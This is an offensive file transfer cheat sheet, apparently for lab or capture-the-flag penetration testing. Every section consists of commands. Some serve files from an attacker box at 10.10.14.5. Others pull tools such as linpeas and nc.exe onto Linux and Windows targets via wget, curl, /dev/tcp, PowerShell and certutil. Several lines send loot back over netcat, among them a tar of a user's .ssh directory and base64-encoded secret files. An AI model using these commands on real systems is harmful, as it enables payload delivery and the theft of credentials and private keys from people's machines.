# File transfer cheat sheet

## Serve files from your attack box
```bash
python3 -m http.server 80                    # http://10.10.14.5/
python3 -m pyftpdlib -p 21 -w                # anonymous writable FTP
impacket-smbserver share . -smb2support      # \\10.10.14.5\share
impacket-smbserver share . -smb2support -user u -password p   # authed (Win11+)
nc -lvnp 4444 > incoming.file                # raw catch
```

## Download onto a Linux target
```bash
wget http://10.10.14.5/linpeas.sh -O /tmp/l.sh
curl http://10.10.14.5/tool -o /tmp/tool
# no wget/curl:
exec 3<>/dev/tcp/10.10.14.5/80; echo -e "GET /f HTTP/1.0\r\n\r" >&3; cat <&3
```

## Download onto a Windows target
```powershell
iwr -uri http://10.10.14.5/nc.exe -outfile C:\Windows\Temp\nc.exe
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/f.exe','C:\Temp\f.exe')
certutil -urlcache -split -f http://10.10.14.5/f.exe f.exe
# From an SMB share:
copy \\10.10.14.5\share\f.exe C:\Temp\f.exe
```

## Exfil loot back to you
```bash
# Linux → your HTTP-less catcher
nc 10.10.14.5 4444 < /tmp/loot.tar.gz
# base64 through a shell when only text works:
base64 -w0 secret.kdbx        # paste, then `base64 -d > secret.kdbx` locally
# Windows:
certutil -encode secret.txt out.b64 & type out.b64
```

## Package a directory for exfil
```bash
tar czf - /home/user/.ssh 2>/dev/null | nc 10.10.14.5 4444
# your side:  nc -lvnp 4444 > ssh.tar.gz
```
